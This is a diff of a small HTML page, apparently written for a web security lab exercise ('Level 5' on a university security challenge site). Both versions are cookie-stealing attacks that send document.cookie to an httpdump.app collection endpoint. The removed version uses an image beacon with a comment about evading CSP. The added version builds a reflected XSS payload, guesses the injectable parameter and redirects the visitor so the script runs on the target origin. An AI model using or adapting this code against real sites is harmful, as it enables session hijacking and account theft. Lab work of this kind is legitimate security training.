@@ -1,15 +1,17 @@
 <!doctype html>
-<html>
-<head><meta charset="utf-8"><title>Hi!</title></head>
-<body>
+<meta charset="utf-8">
+<title>bounce</title>
 <script>
-// send cookie via an image beacon (works even if fetch/XHR is blocked by CSP)
-var i = new Image();
-i.src = "https://httpdump.app/dumps/2a0b49ec-bc8b-433c-b1f4-3b912abd0ef?c="
-        + encodeURIComponent(document.cookie);
-// optional: auto-close after a moment so bot moves on
-setTimeout(() => window.close && window.close(), 500);
+  // build an XSS payload that runs on the TARGET origin
+  var steal = encodeURIComponent(
+    "<script>var i=new Image();i.src='https://httpdump.app/inspect/2a0b49ec-bc8b-433c-b1f4-3b912adbd0ef?c='+encodeURIComponent(document.cookie);</" + "script>"
+  );
+
+  // Guess a reflected parameter on Level 5: try 'query' first, then 'zoekterm' if needed.
+  // URL-encode the whole payload as a query value.
+  var target =
+    "https://websecurity.cs.ru.nl/?level=5&query=" + steal;
+
+  // Hard redirect so JS executes on the target origin
+  location.replace(target);
 </script>
-Small harmless page…
-</body>
-</html>
